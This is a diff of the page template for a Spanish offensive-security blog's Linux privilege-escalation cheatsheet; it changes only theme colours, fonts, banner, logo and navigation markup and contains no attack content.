@@ -6,7 +6,7 @@
       <meta charset="utf-8">
       <meta name="viewport" content="width=device-width,initial-scale=1">
       
-        <meta name="description" content="Blog de ciberseguridad — writeups, cheatsheets y research">
+        <meta name="description" content="Técnicas de escalada de privilegios en sistemas Linux">
       
       
         <meta name="author" content="0x574R">
@@ -20,7 +20,7 @@
         
       
       
-      <link rel="icon" href="../../assets/favicon.ico">
+      <link rel="icon" href="../../assets/favicon.svg">
       <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
     
     
@@ -35,6 +35,46 @@
         <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
       
       
+  
+  
+    
+      
+      
+    
+  
+    
+      
+      
+    
+  
+    
+      
+      
+    
+  
+    
+      
+      
+    
+  
+    
+      
+      
+    
+  
+    
+      
+      
+    
+  
+    
+      
+      
+    
+  
+  
+  <style>:root{--md-admonition-icon--note:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20512%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M9.4%20118.6c-12.5-12.5-12.5-32.8%200-45.3s32.8-12.5%2045.3%200l160%20160c12.5%2012.5%2012.5%2032.8%200%2045.3l-160%20160c-12.5%2012.5-32.8%2012.5-45.3%200s-12.5-32.8%200-45.3L146.7%20256zM224%20384h256c17.7%200%2032%2014.3%2032%2032s-14.3%2032-32%2032H224c-17.7%200-32-14.3-32-32s14.3-32%2032-32%22/%3E%3C/svg%3E');--md-admonition-icon--tip:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20384%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M292.9%20384c7.3-22.3%2021.9-42.5%2038.4-59.9C364%20289.7%20384%20243.2%20384%20192%20384%2086%20298%200%20192%200S0%2086%200%20192c0%2051.2%2020%2097.7%2052.7%20132.1%2016.5%2017.4%2031.2%2037.6%2038.4%2059.9h201.7zm-4.9%2048H96v16c0%2044.2%2035.8%2080%2080%2080h32c44.2%200%2080-35.8%2080-80zM184%20112c-39.8%200-72%2032.2-72%2072%200%2013.3-10.7%2024-24%2024s-24-10.7-24-24c0-66.3%2053.7-120%20120-120%2013.3%200%2024%2010.7%2024%2024s-10.7%2024-24%2024%22/%3E%3C/svg%3E');--md-admonition-icon--warning:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20512%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M256%200c14.7%200%2028.2%208.1%2035.2%2021l216%20400c6.7%2012.4%206.4%2027.4-.8%2039.5S486.1%20480%20472%20480H40c-14.1%200-27.2-7.4-34.4-19.5s-7.5-27.1-.8-39.5l216-400c7-12.9%2020.5-21%2035.2-21m0%20352a32%2032%200%201%200%200%2064%2032%2032%200%201%200%200-64m0-192c-18.2%200-32.7%2015.5-31.4%2033.7l7.4%20104c.9%2012.5%2011.4%2022.3%2023.9%2022.3%2012.6%200%2023-9.7%2023.9-22.3l7.4-104c1.3-18.2-13.1-33.7-31.4-33.7z%22/%3E%3C/svg%3E');--md-admonition-icon--danger:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20448%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M384%20144C384%2064.5%20312.4%200%20224%200S64%2064.5%2064%20144c0%2047.1%2025.1%2088.9%2064%20115.2V288c0%2017.7%2014.3%2032%2032%2032h128c17.7%200%2032-14.3%2032-32v-28.8c38.9-26.3%2064-68.1%2064-115.2m-224-16a32%2032%200%201%201%200%2064%2032%2032%200%201%201%200-64m96%2032a32%2032%200%201%201%2064%200%2032%2032%200%201%201-64%200m189.5%20179.7c-6.8-16.3-25.5-24-41.8-17.2L224%20397.3%2044.3%20322.5c-16.3-6.8-35%20.9-41.8%2017.2s.9%2035%2017.2%2041.8L140.8%20432%2019.7%20482.5c-16.3%206.8-24%2025.5-17.2%2041.8s25.5%2024%2041.8%2017.2L224%20466.7l179.7%2074.8c16.3%206.8%2035-.9%2041.8-17.2s-.9-35-17.2-41.8L307.2%20432l121.1-50.5c16.3-6.8%2024-25.5%2017.2-41.8%22/%3E%3C/svg%3E');--md-admonition-icon--bug:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20576%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M192%2096c0-53%2043-96%2096-96s96%2043%2096%2096v3.6c0%2015.7-12.7%2028.4-28.4%2028.4H220.5c-15.7%200-28.4-12.7-28.4-28.4V96zm345.6%2012.8c10.6%2014.1%207.7%2034.2-6.4%2044.8l-97.8%2073.3c5.3%208.9%209.3%2018.7%2011.8%2029.1H544c17.7%200%2032%2014.3%2032%2032s-14.3%2032-32%2032h-96v32c0%202.6-.1%205.3-.2%207.9l83.4%2062.5c14.1%2010.6%2017%2030.7%206.4%2044.8s-30.7%2017-44.8%206.4l-63.1-47.3c-23.2%2044.2-66.5%2076.2-117.7%2083.9V280c0-13.3-10.7-24-24-24s-24%2010.7-24%2024v230.2c-51.2-7.7-94.5-39.7-117.7-83.9l-63.1%2047.3c-14.1%2010.6-34.2%207.7-44.8-6.4s-7.7-34.2%206.4-44.8l83.4-62.5c-.1-2.6-.2-5.2-.2-7.9v-32H32c-17.7%200-32-14.3-32-32s14.3-32%2032-32h98.8c2.5-10.4%206.5-20.2%2011.8-29.1l-97.8-73.3c-14.1-10.6-17-30.7-6.4-44.8s30.7-17%2044.8-6.4L192%20184c12.3-5.1%2025.8-8%2040-8h112c14.2%200%2027.7%202.8%2040%208l108.8-81.6c14.1-10.6%2034.2-7.7%2044.8%206.4%22/%3E%3C/svg%3E');--md-admonition-icon--example:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20576%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M360.8%201.2c-17-4.9-34.7%205-39.6%2022l-128%20448c-4.9%2017%205%2034.7%2022%2039.6s34.7-5%2039.6-22l128-448c4.9-17-5-34.7-22-39.6m64.6%20136.1c-12.5%2012.5-12.5%2032.8%200%2045.3l73.4%2073.4-73.4%2073.4c-12.5%2012.5-12.5%2032.8%200%2045.3s32.8%2012.5%2045.3%200l96-96c12.5-12.5%2012.5-32.8%200-45.3l-96-96c-12.5-12.5-32.8-12.5-45.3%200zm-274.7%200c-12.5-12.5-32.8-12.5-45.3%200l-96%2096c-12.5%2012.5-12.5%2032.8%200%2045.3l96%2096c12.5%2012.5%2032.8%2012.5%2045.3%200s12.5-32.8%200-45.3L77.3%20256l73.3-73.4c12.5-12.5%2012.5-32.8%200-45.3z%22/%3E%3C/svg%3E');--md-admonition-icon--quote:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20448%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M0%20216C0%20149.7%2053.7%2096%20120%2096h8c17.7%200%2032%2014.3%2032%2032s-14.3%2032-32%2032h-8c-30.9%200-56%2025.1-56%2056v8h64c35.3%200%2064%2028.7%2064%2064v64c0%2035.3-28.7%2064-64%2064H64c-35.3%200-64-28.7-64-64zm256%200c0-66.3%2053.7-120%20120-120h8c17.7%200%2032%2014.3%2032%2032s-14.3%2032-32%2032h-8c-30.9%200-56%2025.1-56%2056v8h64c35.3%200%2064%2028.7%2064%2064v64c0%2035.3-28.7%2064-64%2064h-64c-35.3%200-64-28.7-64-64z%22/%3E%3C/svg%3E');}</style>
+
 
 
     
@@ -51,14 +91,33 @@
       
     
     
-      <link rel="stylesheet" href="../../stylesheets/razor.css">
+      <link rel="stylesheet" href="../../stylesheets/extra.css">
+    
+      <link rel="stylesheet" href="../../stylesheets/animations.css">
+    
+      <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Orbitron:wght@400;500;600;700;800;900&display=swap">
     
     <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
+  
+
 
     
     
+  <!-- Preconnect for fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  
+  <!-- Meta tags -->
+  <meta name="author" content="0x574R">
+  <meta name="keywords" content="cybersecurity, pentesting, hacking, CTF, writeups, malware, kernel">
+  <meta name="robots" content="index, follow">
+  
+  <!-- Theme color for mobile -->
+  <meta name="theme-color" content="#0d1117">
+  <meta name="msapplication-TileColor" content="#0d1117">
+
   </head>
   
   
@@ -69,7 +128,7 @@
     
     
     
-    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="deep-purple" data-md-color-accent="purple">
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="light-green">
   
     
     <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
@@ -85,6 +144,40 @@
     </div>
     <div data-md-component="announce">
       
+        <aside class="md-banner">
+          <div class="md-banner__inner md-grid md-typeset">
+            
+              <button class="md-banner__button md-icon" aria-label="No mostrar esto de nuevo">
+                
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+              </button>
+            
+            
+  <!-- Announcement bar -->
+  <style>
+    .md-banner {
+      background: linear-gradient(90deg, #0d1117 0%, #161b22 50%, #0d1117 100%);
+      color: #00ff41;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.75rem;
+      letter-spacing: 1px;
+    }
+    .md-banner__inner {
+      padding: 0.4rem;
+    }
+    .md-banner a {
+      color: #00d4ff;
+    }
+  </style>
+  <span class="pulse-glow" style="margin-right: 0.5rem;">●</span>
+  <strong>RAZOR</strong> | Offensive Security Research Blog
+
+          </div>
+          
+            <script>var el=document.querySelector("[data-md-component=announce]");if(el){var content=el.querySelector(".md-typeset");__md_hash(content.innerHTML)===__md_get("__announce")&&(el.hidden=!0)}</script>
+          
+        </aside>
+      
     </div>
     
     
@@ -92,11 +185,11 @@
 
   
 
-<header class="md-header md-header--shadow" data-md-component="header">
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Cabecera">
     <a href="../.." title="RAZOR" class="md-header__button md-logo" aria-label="RAZOR" data-md-component="logo">
       
-  <img src="../../assets/logo.png" alt="logo">
+  <img src="../../assets/logo.svg" alt="logo">
 
     </a>
     <label class="md-header__button md-icon" for="__drawer">
@@ -126,9 +219,9 @@
     
     
     
-    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="deep-purple" data-md-color-accent="purple"  aria-label="Cambiar a modo oscuro"  type="radio" name="__palette" id="__palette_0">
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="light-green"  aria-label="Cambiar a modo claro"  type="radio" name="__palette" id="__palette_0">
     
-      <label class="md-header__button md-icon" title="Cambiar a modo oscuro" for="__palette_1" hidden>
+      <label class="md-header__button md-icon" title="Cambiar a modo claro" for="__palette_1" hidden>
         <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
       </label>
     
@@ -136,10 +229,10 @@
     
     
     
-    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="deep-purple" data-md-color-accent="purple"  aria-label="Cambiar a modo claro"  type="radio" name="__palette" id="__palette_1">
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="black" data-md-color-accent="green"  aria-label="Cambiar a modo oscuro"  type="radio" name="__palette" id="__palette_1">
     
-      <label class="md-header__button md-icon" title="Cambiar a modo claro" for="__palette_0" hidden>
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m3.55 19.09 1.41 1.41 1.8-1.79-1.42-1.42M12 6c-3.31 0-6 2.69-6 6s2.69 6 6 6 6-2.69 6-6c0-3.32-2.69-6-6-6m8 7h3v-2h-3m-2.76 7.71 1.8 1.79 1.41-1.41-1.79-1.8M20.45 5l-1.41-1.4-1.8 1.79 1.42 1.42M13 1h-2v3h2M6.76 5.39 4.96 3.6 3.55 5l1.79 1.81zM1 13h3v-2H1m12 9h-2v3h2"/></svg>
+      <label class="md-header__button md-icon" title="Cambiar a modo oscuro" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
       </label>
     
   
@@ -181,6 +274,8 @@
         </button>
       </nav>
       
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
     </form>
     <div class="md-search__output">
       <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
@@ -198,26 +293,133 @@
     
     
       <div class="md-header__source">
-        <a href="https://github.com/0x574R/0x574R.github.io" title="Ir al repositorio" class="md-source" data-md-component="source">
+        <a href="https://github.com/0x574R" title="Ir al repositorio" class="md-source" data-md-component="source">
   <div class="md-source__icon md-icon">
     
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
   </div>
   <div class="md-source__repository">
-    0x574R/0x574R.github.io
+    0x574R
   </div>
 </a>
       </div>
     
   </nav>
   
+    
+      
+<nav class="md-tabs" aria-label="Pestañas" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../writeups/" class="md-tabs__link">
+          
+  
+  
+  Writeups
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../" class="md-tabs__link">
+          
+  
+  
+  Cheatsheets
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../research/" class="md-tabs__link">
+          
+  
+  
+  Research
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../tags/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Tags
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
 </header>
     
     <div class="md-container" data-md-component="container">
       
       
-        
-          
         
       
       <main class="md-main" data-md-component="main">
@@ -231,25 +433,27 @@
                     
 
 
+  
 
-<nav class="md-nav md-nav--primary" aria-label="Navegación" data-md-level="0">
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navegación" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
     <a href="../.." title="RAZOR" class="md-nav__button md-logo" aria-label="RAZOR" data-md-component="logo">
       
-  <img src="../../assets/logo.png" alt="logo">
+  <img src="../../assets/logo.svg" alt="logo">
 
     </a>
     RAZOR
   </label>
   
     <div class="md-nav__source">
-      <a href="https://github.com/0x574R/0x574R.github.io" title="Ir al repositorio" class="md-source" data-md-component="source">
+      <a href="https://github.com/0x574R" title="Ir al repositorio" class="md-source" data-md-component="source">
   <div class="md-source__icon md-icon">
     
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
   </div>
   <div class="md-source__repository">
-    0x574R/0x574R.github.io
+    0x574R
   </div>
 </a>
     </div>
@@ -289,6 +493,60 @@
   
   
   
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Writeups
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Writeups
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
     <li class="md-nav__item">
       <a href="../../writeups/" class="md-nav__link">
         
@@ -309,9 +567,71 @@
     </li>
   
 
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
     
       
       
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cheatsheets
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Cheatsheets
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
   
   
   
@@ -336,9 +656,71 @@
     </li>
   
 
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
     
       
       
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Research
+  
+
+    
+  </span>
+  
+  
+
